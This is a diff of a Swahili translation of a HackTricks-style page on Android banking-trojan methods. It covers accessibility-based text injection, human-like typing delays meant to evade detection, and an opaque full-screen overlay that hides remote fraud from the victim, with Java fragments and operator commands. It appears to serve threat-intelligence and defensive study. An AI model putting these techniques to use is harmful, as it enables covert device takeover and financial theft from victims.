-- Discovery mode: orodhesha nodes zinazoonekana kwa selectors na bounds ili kulenga kwa usahihi inputs (ID, text, contentDescription, hint, bounds) kabla ya kuchukua hatua.
-- Utoaji wa maandishi mara mbili:
-- Mode 1 – `ACTION_SET_TEXT` directly on the target node (thabiti, hakuna keyboard);
-- Mode 2 – clipboard set + `ACTION_PASTE` into the focused node (inafanya kazi wakati `setText` ya moja kwa moja imezuiwa).
-- Human-like cadence: gawanya string iliyotolewa na operator na ilete herufi kwa herufi kwa ucheleweshaji wa nasibu wa 300–3000 ms kati ya matukio ili kuepuka heuristics za “machine-speed typing”. Itekelezwe kwa kuongeza polepole thamani kupitia `ACTION_SET_TEXT`, au kwa kubandika herufi moja kwa wakati.
+- Modi ya ugundaji: orodhesha nodes zinazoonekana kwa kutumia selectors na bounds ili kulenga kwa usahihi inputs (ID, text, contentDescription, hint, bounds) kabla ya kuchukua hatua.
+- Uingizaji wa maandishi mara mbili:
+- Modi 1 – `ACTION_SET_TEXT` moja kwa moja kwenye node lengwa (thabiti, hakuna keyboard);
+- Modi 2 – kuweka clipboard + `ACTION_PASTE` kwenye node iliyozingatiwa (inafanya kazi wakati setText ya moja kwa moja imezuiwa).
+- Midundo kama ya kibinadamu: gawanya string iliyotolewa na operator na uwasilishe herufi kwa herufi kwa ucheleweshaji wa nasibu wa 300–3000 ms kati ya matukio ili kuepuka heuristics za "machine-speed typing". Imefanywa ama kwa kukuza taratibu thamani kupitia `ACTION_SET_TEXT`, au kwa kubandika char moja kwa wakati.
 
 <details>
-<summary>Java sketch: ugunduzi wa node + utoaji uliocheleweshwa kwa herufi kwa kutumia setText au clipboard+paste</summary>
+<summary>Mfano wa Java: ugundaji wa node + uingizaji wa herufi uliocheleweshwa kupitia setText au clipboard+paste</summary>
 ```java
 // Enumerate nodes (HVNCA11Y-like): text, id, desc, hint, bounds
 void discover(AccessibilityNodeInfo r, List<String> out){
@@ -427,8 +432,8 @@ Thread.sleep(300 + new java.util.Random().nextInt(2701));
 ```
 </details>
 
-Overlays za kuzuia kwa ajili ya kuficha udanganyifu:
-- Tengeneza `TYPE_ACCESSIBILITY_OVERLAY` ya skrini nzima yenye opacity inayodhibitiwa na operator; iwe isiyo wazi (opaque) kwa mwathiri huku automation ya mbali ikiendelea chini yake.
+Kuzuia overlays kwa ajili ya kuficha udanganyifu:
+- Onyesha overlay ya skrini nzima ya `TYPE_ACCESSIBILITY_OVERLAY` yenye opacity inayodhibitiwa na operator; iiwe isiyo wazi kwa mhusika wakati automation ya mbali inaendelea chini yake.
 - Amri zinazotolewa kawaida: `opacityOverlay <0..255>`, `sendOverlayLoading <html/url>`, `removeOverlay`.
 
 Overlay ndogo yenye alpha inayoweza kubadilishwa:
@@ -442,7 +447,7 @@ WindowManager.LayoutParams.FLAG_NOT_TOUCH_MODAL,
 PixelFormat.TRANSLUCENT);
 wm.addView(v, lp);
 ```
-Vipengele vya msingi vya udhibiti vya operatori vinavyoonekana mara kwa mara: `BACK`, `HOME`, `RECENTS`, `CLICKTXT`/`CLICKDESC`/`CLICKELEMENT`/`CLICKHINT`, `TAP`/`SWIPE`, `NOTIFICATIONS`, `OPNPKG`, `VNC`/`VNCA11Y` (screen sharing).
+Primitivi za udhibiti za operator zinazotokea mara nyingi: `BACK`, `HOME`, `RECENTS`, `CLICKTXT`/`CLICKDESC`/`CLICKELEMENT`/`CLICKHINT`, `TAP`/`SWIPE`, `NOTIFICATIONS`, `OPNPKG`, `VNC`/`VNCA11Y` (ugawaji wa skrini).
 
 ## Marejeo
 
@@ -457,5 +462,7 @@ Vipengele vya msingi vya udhibiti vya operatori vinavyoonekana mara kwa mara: `B
 - [Banker Trojan Targeting Indonesian and Vietnamese Android Users (DomainTools)](https://dti.domaintools.com/banker-trojan-targeting-indonesian-and-vietnamese-android-users/)
 - [DomainTools SecuritySnacks – ID/VN Banker Trojans (IOCs)](https://github.com/DomainTools/SecuritySnacks/blob/main/2025/BankerTrojan-ID-VN)
 - [Socket.IO](https://socket.io)
+- [Bypassing Android 13 Restrictions with SecuriDropper (ThreatFabric)](https://www.threatfabric.com/blogs/droppers-bypassing-android-13-restrictions)
+- [Web Clips payload settings for Apple devices](https://support.apple.com/guide/deployment/web-clips-payload-settings-depbc7c7808/web)
 
 {{#include ../../banners/hacktricks-training.md}}
